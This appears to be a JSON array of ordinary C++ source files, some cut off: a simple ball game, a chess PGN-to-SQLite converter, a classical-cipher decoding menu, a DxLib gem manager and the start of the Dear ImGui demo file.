\u753b\u7a97\u53e3\r\n\thWnd = initgraph(WIDTH, HEIGHT);\r\n\t//2 \u654c\u5bf9\u7403\u7684\u521d\u59cb\u5316\r\n\tBall* pb = NULL;\r\n\tfor (int i = 0; i < NUM; i++){\r\n\t\tpb = new Ball;\r\n\t\tpb->x = 1;\r\n\t\tpb->y = HEIGHT / 2;\r\n\t\t//\u534a\u5f84\u57281 \u5230 50 \u4e4b\u95f4 \u968f\u673a\r\n\t\tpb->radius = rand() % 50 + 1;\r\n\t\t//\u989c\u8272\u5728colors\u7684\u4e03\u4e2a\u989c\u8272\u4e2d\u968f\u673a\r\n\t\tpb->color = colors[rand() % 7];\r\n\t\t//\u65b9\u5411\u968f\u673a\r\n\t\tpb->fx.x = rand() % 5 + 1;\r\n\t\tpb->fx.y = (rand() % 10) - 5;\r\n\r\n\t\t//\u628a\u505a\u51fa\u6765\u7684\u654c\u5bf9\u7403\u653e\u5230\u6570\u7ec4\u91cc\u9762\u53bb\r\n\t\tdiBalls.push_back(*pb);\r\n\t}\r\n\t//3 \u81ea\u5df1\u7403\u7684\u521d\u59cb\u5316\r\n\tmyBall.color = RED;\r\n\tmyBall.x = 500;\r\n\tmyBall.y = 700;\r\n\tmyBall.radius = 5;\r\n}\r\n\r\nvoid drawGame(){\r\n\t//\u8bbe\u7f6e\u5b9a\u65f6\u5668    \u5c31\u50cf\u5b9a\u4e2a\u95f9\u949f\r\n\tSetTimer(hWnd, 10086, 50, (TIMERPROC)proc);\r\n\t//\u521b\u5efa\u7ebf\u7a0b\r\n\tCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)setMyBall, NULL, NULL, NULL);\r\n\twhile (1){\r\n\t\tcontrolGame();\r\n\t\tif (!isLive) break;\r\n\t\tBeginBatchDraw();\r\n\r\n\r\n\t\t//1 \u8bbe\u7f6e\u80cc\u666f\r\n\t\tsetbkcolor(WHITE);\r\n\t\tcleardevice();\r\n\t\t//2 \u753b\u81ea\u5df1\u7403\r\n\t\tsetfillcolor(myBall.color);\r\n\t\tsolidcircle(myBall.x, myBall.y, myBall.radius);\r\n\t\t//3 \u753b\u654c\u5bf9\u7403\r\n\t\tfor (int i = 0; i < diBalls.size(); i++){\r\n\t\t\tsetfillcolor(diBalls[i].color);\r\n\t\t\tsolidcircle(diBalls[i].x, diBalls[i].y, diBalls[i].radius);\r\n\t\t}\r\n\r\n\r\n\t\tEndBatchDraw();\r\n\t}\r\n\r\n\tsetbkcolor(RED);\r\n\tcleardevice();\r\n\r\n\touttextxy(100, 100, L\"game over\");\r\n}\r\n\r\nvoid controlGame(){\r\n\t\r\n\r\n\r\n\tint xLen, yLen;\r\n\t//\u5982\u679c\u6709\u7403\u79fb\u52a8\u51fa\u4e86\u5c4f\u5e55,\u91cd\u65b0\u751f\u6210\u4e4b\r\n\tfor (int i = 0; i < diBalls.size(); i++){\r\n\t\txLen = (diBalls[i].x > myBall.x) ? (diBalls[i].x - myBall.x) : (myBall.x - diBalls[i].x);\r\n\t\tyLen = (diBalls[i].y > myBall.y) ? (diBalls[i].y - myBall.y) : (myBall.y - diBalls[i].y);\r\n\t\tif ((xLen* xLen + yLen*yLen) < (diBalls[i].radius + myBall.radius)*(diBalls[i].radius + myBall.radius)){//myBall\u662f\u5426\u548cdiBalls[i]\u78b0\u649e\r\n\t\t\tif (diBalls[i].radius > myBall.radius){\r\n\t\t\t\tisLive = false;\r\n\t\t\t}\r\n\t\t\telse{//\u91cd\u65b0\u751f\u6210\u654c\u5bf9\u7403\u5e76\u4e14\u589e\u52a0\u81ea\u5df1\u7403\u7684\u5927\u5c0f\r\n\t\t\t\tdiBalls[i].x = 1;\r\n\t\t\t\tdiBalls[i].y = HEIGHT / 2;\r\n\t\t\t\t//\u534a\u5f84\u57281 \u5230 50 \u4e4b\u95f4 \u968f\u673a\r\n\t\t\t\tdiBalls[i].radius = rand() % 50 + 1;\r\n\t\t\t\t//\u989c\u8272\u5728colors\u7684\u4e03\u4e2a\u989c\u8272\u4e2d\u968f\u673a\r\n\t\t\t\tdiBalls[i].color = colors[rand() % 7];\r\n\t\t\t\t//\u65b9\u5411\u968f\u673a\r\n\t\t\t\tdiBalls[i].fx.x = rand() % 5 + 1;\r\n\t\t\t\tdiBalls[i].fx.y = (rand() % 10) - 5;\r\n\t\t\t\tif (myBall.radius <= 97)\r\n\t\t\t\t\tmyBall.radius += 3;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t}\r\n\t\tif (diBalls[i].x > WIDTH || diBalls[i].x < 0\r\n\t\t\t|| diBalls[i].y > HEIGHT || diBalls[i].y < 0){\r\n\t\t\tdiBalls[i].x = 1;\r\n\t\t\tdiBalls[i].y = HEIGHT / 2;\r\n\t\t\t//\u534a\u5f84\u57281 \u5230 50 \u4e4b\u95f4 \u968f\u673a\r\n\t\t\tdiBalls[i].radius = rand() % 50 + 1;\r\n\t\t\t//\u989c\u8272\u5728colors\u7684\u4e03\u4e2a\u989c\u8272\u4e2d\u968f\u673a\r\n\t\t\tdiBalls[i].color = colors[rand() % 7];\r\n\t\t\t//\u65b9\u5411\u968f\u673a\r\n\t\t\tdiBalls[i].fx.x = rand() % 5 + 1;\r\n\t\t\tdiBalls[i].fx.y = (rand() % 10) - 5;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid proc(){\r\n\tfor (int i = 0; i < diBalls.size(); i++){\r\n\t\tdiBalls[i].x += diBalls[i].fx.x;\r\n\t\tdiBalls[i].y += diBalls[i].fx.y;\r\n\t}\r\n}\r\n\r\nvoid setMyBall(){\r\n\t//\u83b7\u53d6\u9f20\u6807\u5750\u6807\r\n\t// \u83b7\u53d6\u4e00\u4e2a\u9f20\u6807\u6d88\u606f\u3002\u5982\u679c\u6ca1\u6709\uff0c\u5c31\u7b49\u5f85\r\n\tMOUSEMSG msg;\r\n\twhile (1){\r\n\t\tmsg = GetMouseMsg();\r\n\r\n\t\t//\u7136\u540e\u8bbe\u7f6e\u81ea\u5df1\u7403\u5750\u6807\u4e3a\u9f20\u6807\u5750\u6807\r\n\t\tif (msg.mkLButton){\r\n\t\t\tmyBall.x = msg.x;\r\n\t\t\tmyBall.y = msg.y;\r\n\t\t}\r\n\t}\r\n}",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <tuple>\n#include <vector>\n#include <memory>\n#include <map>\n#include <stdexcept>\n#include <sqlite3.h>\n#include \"chess.hpp\"\n\nusing namespace std;\nusing namespace chess;\n\nstring vector_to_json_array(vector<string> vec)\n{\n\tstringstream ss;\n\n\tss << \"[\";\n\tfor (auto it = vec.begin(); it != vec.end(); it++)\n\t{\n\t\tif (it != vec.begin())\n\t\t{\n\t\t\tss << \", \";\n\t\t}\n\t\tss << '\"' << *it << '\"';\n\t}\n\tss << \"]\";\n\n\treturn ss.str();\n}\n\n// Each piece and color is coded to 64 boards with 1s\n// Then coded are castling rights and side to move\n// Size of 100 to cover all bits (773) and set length for SQLite (requires bytes)\n// Could use 776, but 800 is a nice round number (it doesn't matter)\nbitset<800> board_to_binary(Board board)\n{\n\tColor::underlying piece_colors_list[2] = {Color::WHITE, Color::BLACK};\n\tPieceType::underlying piece_types_list[6] = {\n\t\tPieceType::PAWN,\n\t\tPieceType::ROOK,\n\t\tPieceType::KNIGHT,\n\t\tPieceType::BISHOP,\n\t\tPieceType::QUEEN,\n\t\tPieceType::KING};\n\n\tbitset<800> bits(0);\n\tint position = 0;\n\tfor (auto piece_color : piece_colors_list)\n\t{\n\t\tfor (auto piece_type : piece_types_list)\n\t\t{\n\t\t\t// Append position bits\n\t\t\tbitset<800> temp_bits = board.pieces(piece_type, piece_color).getBits();\n\t\t\ttemp_bits <<= position;\n\t\t\tbits |= temp_bits;\n\n\t\t\tposition += 64;\n\t\t}\n\t}\n\n\t// Adjusting position of bits in the byte\n\tposition += 3;\n\t// Set castling rights bits\n\tfor (auto piece_color : piece_colors_list)\n\t{\n\t\tbits.set(\n\t\t\tposition,\n\t\t\tboard.castlingRights().has(piece_color, Board::CastlingRights::Side::KING_SIDE));\n\t\tposition += 1;\n\n\t\tbits.set(\n\t\t\tposition,\n\t\t\tboard.castlingRights().has(piece_color, Board::CastlingRights::Side::QUEEN_SIDE));\n\t\tposition += 1;\n\t}\n\n\t// Set turn bits\n\tbits.set(position, board.sideToMove() == Color::WHITE);\n\n\treturn bits;\n}\n\nclass PgnVisitor : public pgn::Visitor\n{\npublic:\n\tPgnVisitor(string db_name)\n\t{\n\t\tconst auto sql_create_table_elo_fen_outcomes = R\"(\n\t\t\tCREATE TABLE IF NOT EXISTS elo_fen_outcomes(\n\t\t\t\tid INTEGER PRIMARY KEY AUTOINCREMENT,\n\t\t\t\tSite TEXT,\n\t\t\t\tPositionFen TEXT,\n\t\t\t\tPositionBinary BLOB,\n\t\t\t\tElo INTEGER,\n\t\t\t\tWhiteWon BOOLEAN);\n\t\t)\";\n\t\tconst auto sql_count_elo_fen_outcomes = R\"(\n\t\t\tSELECT COUNT(1) FROM elo_fen_outcomes\n\t\t)\";\n\n\t\tint db_exit_code = SQLITE_OK;\n\t\tchar *db_error_message;\n\n\t\ttry\n\t\t{\n\t\t\t// Create to the SQLite database\n\t\t\tdb_exit_code = sqlite3_open(db_name.c_str(), &db);\n\t\t\tif (db_exit_code != SQLITE_OK)\n\t\t\t{\n\t\t\t\tthrow \"Error creating DB\";\n\t\t\t}\n\n\t\t\t// Create the elo_fen_outcomes table\n\t\t\tdb_exit_code = sqlite3_exec(db, sql_create_table_elo_fen_outcomes, NULL, NULL, &db_error_message);\n\t\t\tif (db_exit_code != SQLITE_OK)\n\t\t\t{\n\t\t\t\tthrow \"Error creating elo_fen_outcomes table\";\n\t\t\t}\n\n\t\t\t// Speeds up the DB I/O\n\t\t\tsqlite3_exec(db, \"PRAGMA synchronous=OFF\", NULL, NULL, &db_error_message);\n\t\t\tsqlite3_exec(db, \"PRAGMA count_changes=OFF\", NULL, NULL, &db_error_message);\n\t\t\tsqlite3_exec(db, \"PRAGMA journal_mode=MEMORY\", NULL, NULL, &db_error_message);\n\t\t\tsqlite3_exec(db, \"PRAGMA temp_store=MEMORY\", NULL, NULL, &db_error_message);\n\t\t}\n\t\tcatch (const char *err_message)\n\t\t{\n\t\t\tcerr << err_message << endl;\n\t\t\tcerr << sqlite3_errmsg(db) << endl;\n\t\t\tsqlite3_free(db_error_message);\n\t\t\tabort();\n\t\t}\n\n\t\tdb_exit_code = sqlite3_exec(\n\t\t\tdb,\n\t\t\tsql_count_elo_fen_outcomes,\n\t\t\tsave_count_table_pgn_games,\n\t\t\t&table_count_elo_fen_outcomes,\n\t\t\t&db_error_message);\n\t\tif (db_exit_code != SQLITE_OK)\n\t\t{\n\t\t\tthrow \"Error counting pgn_games table\";\n\t\t}\n\t}\n\t~PgnVisitor()\n\t{\n\t\tsqlite3_close_v2(db);\n\t}\n\nprivate:\n\tsqlite3 *db;\n\tsqlite3_stmt *stmt;\n\tmap<string, string> headersMap;\n\tvector<string> movesList;\n\tint index = 0;\n\t// Used to skip already added indexes\n\tint table_count_elo_fen_outcomes = 0;\n\n\tvoid startPgn()\n\t{\n\t\theadersMap.clear();\n\t\tmovesList.clear();\n\t}\n\tvoid header(string_view key, string_view value)\n\t{\n\t\t// Skip already added games\n\t\tif (index < table_count_elo_fen_outcomes)\n\t\t{\n\t\t\treturn;\n\t\t}\n\n\t\t// Those fields aren't used and can be empty\n\t\tif (key == \"WhiteTitle\" || key == \"BlackTitle\")\n\t\t{\n\t\t\treturn;\n\t\t}\n\n\t\theadersMap[string(key)] = string(value);\n\t}\n\tvoid startMoves() {}\n\tvoid move(string_view move, string_view comment)\n\t{\n\t\t// Skip already added games\n\t\tif (index < table_count_elo_fen_outcomes)\n\t\t{\n\t\t\treturn;\n\t\t}\n\n\t\tmovesList.push_back(string(move));\n\t}\n\tvoid endPgn()\n\t{\n\t\t// Skip already added games\n\t\tif (index < table_count_elo_fen_outcomes)\n\t\t{\n\t\t\tindex += 1;\n\n\t\t\treturn;\n\t\t}\n\t\t// Used for early stopping\n\t\t// if (index == 100000)\n\t\t// {\n\t\t// \tabort();\n\t\t// }\n\n\t\tint db_exit_code = SQLITE_OK;\n\t\tchar *db_error_message;\n\n\t\t// Update elo_fen_outcomes table\n\t\ttry\n\t\t{\n\t\t\tstmt = NULL;\n\t\t\tconst auto sql_insert_to_elo_fen_outcomes = R\"(\n\t\t\t\tINSERT INTO elo_fen_outcomes (\n\t\t\t\t\tSite,\n\t\t\t\t\tPositionFen,\n\t\t\t\t\tPositionBinary,\n\t\t\t\t\tElo,\n\t\t\t\t\tWhiteWon\n\t\t\t\t) VALUES (?, ?, ?, ?, ?);\n\t\t\t)\";\n\n\t\t\tBoard board;\n\t\t\tfor (auto moveString : movesList)\n\t\t\t{\n\t\t\t\tMove moveObj = uci::parseSan(board, string(moveString));\n\t\t\t\tboard.makeMove(moveObj);\n\n\t\t\t\tstring Sit",
    "// DecryptProject.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <string>\n#include <memory>\n#include <cstdlib>\n#include \"vigenere.h\"\n#include \"xor.h\"\n#include \"affine.h\"\n#include \"morse.h\"\n#include \"railfence.h\"\n#include \"rot.h\"\n#include \"simple_substitution.h\"\n#include \"atbash.h\"\n#include \"baconian.h\"\n#include \"base64.h\"\n#include \"cipher.h\"\n#include \"text.h\"\n\nvoid clearScreen() {\n    #ifdef _WIN32\n    std::system(\"cls\");\n    #else\n    std::system(\"clear\");\n    #endif\n}\n\nvoid printMenu() {\n    std::cout << \"Select decryption algorithm:\\n\";\n    std::cout << \"1. Vigenere Cipher\\n\";\n    std::cout << \"2. XOR-HEX Cipher\\n\";\n    std::cout << \"3. Affine Cipher\\n\";\n    std::cout << \"4. Morse Code\\n\";\n    std::cout << \"5. Rail Fence Cipher\\n\";\n    std::cout << \"6. Atbash Cipher\\n\";\n    std::cout << \"7. Base64 Cipher\\n\";\n    std::cout << \"8. ROT Cipher\\n\";\n    std::cout << \"9. Simple Substitution Cipher\\n\";\n    std::cout << \"10. Baconian Cipher\\n\";\n    std::cout << \"11. Show History\\n\";\n    std::cout << \"12. Remove a Layer\\n\";\n    std::cout << \"13. Exit\\n\";\n    std::cout << \"Enter choice: \";\n}\n\nstd::unique_ptr<Cipher> createCipher(int choice) {\n    switch (choice) {\n    case 1: {\n        std::string key;\n        std::cout << \"Enter key: \";\n        std::getline(std::cin, key);\n        return std::make_unique<vigenereCipher>(key);\n    }\n    case 2: {\n        std::string hexKey;\n        std::cout << \"Enter XOR key (hexadecimal format): \";\n        std::getline(std::cin, hexKey);\n        return std::make_unique<xorCipher>(hexKey);\n    }\n    case 3: {\n        int a, b;\n        std::cout << \"Enter 'a' value: \";\n        std::cin >> a;\n        std::cout << \"Enter 'b' value: \";\n        std::cin >> b;\n        std::cin.ignore();\n        return std::make_unique<affineCipher>(a, b);\n    }\n    case 4: {\n        return std::make_unique<morseCipher>();\n    }\n    case 5: {\n        int numRails;\n        std::cout << \"Enter number of rails: \";\n        std::cin >> numRails;\n        std::cin.ignore();\n        return std::make_unique<railfenceCipher>(numRails);\n    }\n    case 6: {\n        return std::make_unique<atbashCipher>();\n    }\n    case 7: {\n        return std::make_unique<base64Cipher>();\n    }\n    case 8: {\n        int shift;\n        std::cout << \"Enter shift value: \";\n        std::cin >> shift;\n        std::cin.ignore();\n        return std::make_unique<rotCipher>(shift);\n    }\n    case 9: {\n        std::string key;\n        std::cout << \"Enter key: \";\n        std::getline(std::cin, key);\n        return std::make_unique<simpleSubstitutionCipher>(key);\n    }\n    case 10: {\n        return std::make_unique<baconianCipher>();\n    }\n    default:\n        return nullptr;\n    }\n}\n\nint main() {\n    int choice;\n    std::string initialText;\n    std::cout << \"Enter the initial ciphertext: \";\n    std::getline(std::cin, initialText);\n\n    TextManager manager(initialText);\n\n    do {\n        clearScreen();\n        printMenu();\n        std::cin >> choice;\n        std::cin.ignore();\n\n        clearScreen();\n\n        if (choice == 13) break;\n\n        if (choice == 11) {\n            manager.showHistory();\n            std::cout << \"Press Enter to continue...\";\n            std::cin.get();\n            continue;\n        }\n\n        if (choice == 12) {\n            int index;\n            std::cout << \"Enter the index of the layer to remove: \";\n            std::cin >> index;\n            std::cin.ignore();\n            manager.removeCipher(index);\n            std::cout << \"Current text: \" << manager.getText() << std::endl;\n            std::cout << \"Press Enter to continue...\";\n            std::cin.get();\n            continue;\n        }\n\n        auto cipher = createCipher(choice);\n        if (cipher) {\n            manager.applyCipher(std::move(cipher));\n            std::cout << \"Current text: \" << manager.getText() << std::endl;\n        }\n        else {\n            std::cout << \"Invalid choice. Please try again.\" << std::endl;\n        }\n\n        std::cout << \"Press Enter to continue...\";\n        std::cin.get();\n\n    } while (choice != 13);\n\n    return 0;\n}\n",
    "\ufeff#include \"DxLib.h\"\n#include \"Gem.h\"\n#include \"GemManager.h\"\n#include \"Calculation.h\"\n#include \"WaveConstants.h\"\n#include \"Collision.h\"\n#include \"Game.h\"\n\nenum GEM_STATE;\n\n\n/// <summary>\n/// \u30b3\u30f3\u30b9\u30c8\u30e9\u30af\u30bf\n/// </summary>\nGemManager::GemManager()\n\t: modelHandleDiamond\t(-1)\n\t, modelHandleRuby\t\t(-1)\n\t, modelHandleSapphire\t(-1)\n\t, modelHandleEmerald\t(-1)\n    , gemWaveState          (WAVE_FIRST)\n    , resetTimer            (false)\n    , isResetEntryData      (false)\n{\n    // WAVE\u3054\u3068\u306e\u60c5\u5831\u3092\u4ee3\u5165\n    waveConstantsTable[WAVE_FIRST] = new WaveConstants(5, 20, \"WAVE_FIRST\");\n    waveConstantsTable[WAVE_SECOND] = new WaveConstants(3, 30, \"WAVE_SECOND\");\n    waveConstantsTable[WAVE_THIRD] = new WaveConstants(1, 40, \"WAVE_THIRD\");\n    waveConstantsTable[WAVE_END] = new WaveConstants(0, 0, \"WAVE_END\");\n    // \u30e2\u30c7\u30eb\u30cf\u30f3\u30c9\u30eb\u306e\u53d6\u5f97\n    modelHandleDiamond = MV1LoadModel(\"data/model/Gem/Diamonds.mv1\");\n    modelHandleRuby = MV1LoadModel(\"data/model/Gem/Ruby.mv1\");\n    modelHandleSapphire = MV1LoadModel(\"data/model/Gem/Sapphire.mv1\");\n    modelHandleEmerald = MV1LoadModel(\"data/model/Gem/Emerald.mv1\");\n}\n\n/// <summary>\n/// \u30c7\u30b9\u30c8\u30e9\u30af\u30bf\n/// </summary>\nGemManager::~GemManager()\n{\n    // \u5b9d\u77f3\u306e\u524a\u9664\n    DeleteGem();\n}\n\n/// <summary>\n/// \u5b9d\u77f3\u306e\u751f\u6210\n/// </summary>\nvoid GemManager::CreateGem()\n{\n    for (int i = 0; i < GEM_TOTAL_NUM; i++)\n    {\n        gems.push_back(new Gem());\n    }\n}\n\n/// <summary>\n/// \u5b9d\u77f3\u306e\u524a\u9664\n/// </summary>\nvoid GemManager::DeleteGem()\n{\n    for (int i = 0; i < GEM_TOTAL_NUM; i++)\n    {\n        delete(gems[i]);\n    }\n}\n\n/// <summary>\n/// \u5b9d\u77f3\u306e\u521d\u671f\u5316\n/// </summary>\nvoid GemManager::Initialize()\n{\n    // \u521d\u671f\u5316\u95a2\u6570\u306e\u547c\u3073\u51fa\u3057\n    for (int i = 0; i < GEM_TOTAL_NUM; i++)\n    {\n        gems[i]->gemType = GetRand(3);\n        // \u5b9d\u77f3\u306e\u30bf\u30a4\u30d7\u5225\u306b\u30e2\u30c7\u30eb\u30cf\u30f3\u30c9\u30eb\u3092\u8a2d\u5b9a\u3059\u308b\n        int _modelHandle = SettingGemModle(gems[i]->gemType);\n        gems[i]->Initialize(_modelHandle);\n    }\n    // \u5b9d\u77f3\u306e\u30a8\u30f3\u30c8\u30ea\u30fc\u60c5\u5831\u306e\u4f5c\u6210\n    CreateEntyrInformation();\n\n    // \u5b9d\u77f3\u306e\u30a8\u30f3\u30c8\u30ea\u30fc\u60c5\u5831\u306e\u66f8\u304d\u8fbc\u307f\n    for (int i = 0; i < GEM_TOTAL_NUM; i++)\n    {\n        gems[i]->entryTime = entryGemDataBase[i].entryTime;         // \u767b\u5834\u6642\u9593\n        gems[i]->entryPosition = entryGemDataBase[i].entryPosition; // \u767b\u5834\u5ea7\u6a19\n    }\n}\n\n/// <summary>\n/// \u5b9d\u77f3\u30e2\u30c7\u30eb\u306e\u30ed\u30fc\u30c9\n/// </summary>\nvoid GemManager::LoadModle()\n{\n\t// \u5b9d\u77f3\u306e\u30e2\u30c7\u30eb\u3092\u30ed\u30fc\u30c9\n\tif (modelHandleDiamond <= -1)\n\t{\t// \u30c0\u30a4\u30a2\u30e2\u30f3\u30c9\n\t\tmodelHandleDiamond\t= MV1LoadModel(\"data/model/Gem/Diamonds.mv1\");\n\t}\n\tif (modelHandleRuby <= -1)\n\t{\t// \u30eb\u30d3\u30fc\n\t\tmodelHandleRuby\t\t= MV1LoadModel(\"data/model/Gem/Ruby.mv1\");\n\t}\n\tif (modelHandleSapphire <= -1)\n\t{\t// \u30b5\u30d5\u30a1\u30a4\u30a2\n\t\tmodelHandleSapphire = MV1LoadModel(\"data/model/Gem/Sapphire.mv1\");\n\t}\n\tif (modelHandleEmerald <= -1)\n\t{\t// \u30a8\u30e1\u30e9\u30eb\u30c9\n\t\tmodelHandleEmerald\t= MV1LoadModel(\"data/model/Gem/Emerald.mv1\");\n\t}\n}\n\n/// <summary>\n/// \u30bf\u30a4\u30d7\u3092\u3082\u3089\u3063\u3066\u30e2\u30c7\u30eb\u30cf\u30f3\u30c9\u30eb\u3092\u8a2d\u5b9a\n/// </summary>\n/// <param name=\"type\">\u5b9d\u77f3\u306e\u30bf\u30a4\u30d7</param>\n/// <returns>\u305d\u306e\u30bf\u30a4\u30d7\u306e\u30e2\u30c7\u30eb\u30cf\u30f3\u30c9\u30eb</returns>\nint GemManager::SettingGemModle(int type)\n{\n\t// \u305d\u306e\u30bf\u30a4\u30d7\u306e\u30e2\u30c7\u30eb\u30cf\u30f3\u30c9\u30eb\n\tint reTypeModelHandle = -1;\n\n\t// \u7a2e\u985e(\u30bf\u30a4\u30d7)\u306e\u5224\u5b9a\n\tswitch (type)\n\t{\n\t// \u30a8\u30e1\u30e9\u30eb\u30c9\n\tcase EMERALD:\t\n\t\treTypeModelHandle = modelHandleEmerald;\n\t\tbreak;\n\n\t// \u30eb\u30d3\u30fc\n\tcase RUBY:\t\t\n\t\treTypeModelHandle = modelHandleRuby;\n\t\tbreak;\n\n\t// \u30b5\u30d5\u30a1\u30a4\u30a2\n\tcase SAPPHIRE:\t\n\t\treTypeModelHandle = modelHandleSapphire;\n\t\tbreak;\n\n\t// \u30c0\u30a4\u30a2\u30e2\u30f3\u30c9\n\tcase DIAMOND:\t\n\t\treTypeModelHandle = modelHandleDiamond;\n\t\tbreak;\n\n        // \u305d\u308c\u4ee5\u5916\n\tdefault:\n\t\tbreak;\n\t}\n\t\n\t// \u305d\u306e\u30bf\u30a4\u30d7\u306e\u30e2\u30c7\u30eb\u30cf\u30f3\u30c9\u30eb\u3092\u8fd4\u3059\n\treturn reTypeModelHandle;\n}\n\n\n/// <summary>\n/// \u5b9d\u77f3\u306e\u30a8\u30f3\u30c8\u30ea\u30fc\u60c5\u5831\u3092\u4f5c\u6210\n/// </summary>\n/// <param name=\"data\">\u5b9d\u77f3\u306e\u30a8\u30f3\u30c8\u30ea\u30fc\u60c5\u5831\u3092\u683c\u7d0d\u3059\u308b\u591a\u6b21\u5143\u914d\u5217</param>\n/// <param name=\"size\">\u591a\u6b21\u5143\u914d\u5217\u306e\u6dfb\u3048\u5b57\u6570</param>\nvoid GemManager::CreateEntryData(EntryGemDataBase data[],int size)\n{\n    // \u73fe\u5728\u306eWAVE\u306b\u5fc5\u8981\u306a\u60c5\u5831\u3092\u5f15\u304d\u51fa\u3059\n    // NOTE:(WAVE_STATE)gemWaveState\u3067\u30ad\u30e3\u30b9\u30c8\u5909\u63db\u3057\u306a\u3044\u3068\u4f7f\u7528\u3067\u304d\u306a\u3044\n    auto constant = waveConstantsTable[(WAVE_STATE)gemWaveState];\n\n    for (int i = 0; i < size; i++)\n    {\n        // \u767b\u5834\u6642\u9593\u3092\u8a2d\u5b9a\n        data[i].entryTime = i * constant->entryTime;\n        // \u767b\u5834\u5ea7\u6a19\u306e\u8a2d\u5b9a\n        data[i].entryPosition = VGet(-18, 15, -5); // \u30ab\u30e1\u30e9\u5de6\u4e0a\n    }\n}\n\n/// <summary>\n/// \u5b9d\u77f3\u306e\u30a8\u30f3\u30c8\u30ea\u30fc\u60c5\u5831\u306e\u4f5c\u6210\n/// </summary>\nvoid GemManager::CreateEntyrInformation()\n{\n    // \u73fe\u5728\u306eWAVE\u306b\u5fc5\u8981\u306a\u60c5\u5831\u3092\u5f15\u304d\u51fa\u3059\n    // NOTE:(WAVE_STATE)gemWaveState\u3067\u30ad\u30e3\u30b9\u30c8\u5909\u63db\u3057\u306a\u3044\u3068\u4f7f\u7528\u3067\u304d\u306a\u3044\n    auto constant = waveConstantsTable[(WAVE_STATE)gemWaveState];\n\n    for (int i = 0; i < GEM_TOTAL_NUM; i++)\n    {\n        // \u767b\u5834\u6642\u9593\u3092\u8a2d\u5b9a\n        entryGemDataBase[i].entryTime = i * constant->entryTime;\n        // \u767b\u5834\u5ea7\u6a19\u306e\u8a2d\u5b9a\n        entryGemDataBase[i].entryPosition = VGet(-18, 15, -5); // \u30ab\u30e1\u30e9\u5de6\u4e0a\n    }\n}\n\n/// <summary>\n/// \u5b9d\u77f3\u306e\u30a8\u30f3\u30c8\u30ea\u30fc\u60c5\u5831\u3092\u8a2d\u5b9a\n/// </summary>\n/// <param name=\"gem\">\u5b9d\u77f3\u30af\u30e9\u30b9</param>\n/// <param name=\"size\">\u5b9d\u77f3\u306e\u7dcf\u6570</param>\nvoid GemManager::SettingEntryDataBase(Gem& gem,int index)\n{\n\t// \u7c21\u5358\u306b\u5909\u6570\u306b\u3059\u308b\n\tfloat _gemEntryTime = entryGemDataBase[index].entryTime;\n\tVECTOR _gemPos = entryGemDataBase[index].entryPosition;\n\n\t// \u5b9f\u969b\u306b\u66f8\u304d\u8fbc\u307f\n\tgem.SetEntryTime(_gemEntryTime);// \u767b\u5834\u6642\u9593\u306e\u8a2d\u5b9a\n\tgem.SetEntryPosition(_gemPos);\t// \u767b\u5834\u5ea7\u6a19\u306e\u8a2d\u5b9a\n}\n\n/// <summary>\n/// \u5b9d\u77f3\u306e\u5f53\u305f\u308a\u5224\u5b9a\u66f4\u65b0\n/// </summary>\n/// <param name=\"player\">\u30d7\u30ec\u30a4\u30e4\u30fc</param>\n/// <param name=\"chest\">\u5b9d\u7bb1</param>\n/// <returns>\u30b9\u30b3\u30a2\u30a2\u30c3\u30d7\u306e\u30bf\u30a4\u30df\u30f3\u30b0\u3069\u3046\u304b</returns>\nbool GemManager::IsCollisionGem(Player& player, TreasureChest& chest, Collision& collision)\n{\n    // \u30b9\u30b3\u30a2",
    "// dear imgui, v1.90.8 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Need help integrating Dear ImGui in your codebase?\n//   - Read Getting Started https://github.com/ocornut/imgui/wiki/Getting-Started\n//   - Read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// Read top of imgui.cpp and imgui.h for many details, documentation, comments, links.\n// Get the latest version at https://github.com/ocornut/imgui\n\n// How to easily locate code?\n// - Use the Item Picker to debug break in code by clicking any widgets: https://github.com/ocornut/imgui/wiki/Debug-Tools\n// - Browse an online version the demo with code linked to hovered widgets: https://pthom.github.io/imgui_manual_online/manual/imgui_manual.html\n// - Find a visible string and search for it in the code!\n\n//---------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n//---------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n//--------------------------------------------\n// ABOUT THE MEANING OF THE 'static' KEYWORD:\n//--------------------------------------------\n// In this demo code, we frequently use 'static' variables inside functions.\n// A static variable persists across calls. It is essentially a global variable but declared inside the scope of the function.\n// Think of \"static int n = 0;\" as \"global int n = 0;\" !\n// We do this IN THE DEMO because we want:\n// - to gather code and data in the same place.\n// - to make the demo source code faster to read, faster to change, smaller in size.\n// - it is also a convenient way of storing simple UI related information as long as your function\n//   doesn't need to be reentrant or used in multiple threads.\n// This might be a pattern you will want to use in your code, but most of the data you would be working\n// with in a complex codebase is likely going to be stored outside your functions.\n\n//-----------------------------------------\n// ABOUT THE CODING STYLE OF OUR DEMO CODE\n//-----------------------------------------\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui.h using the 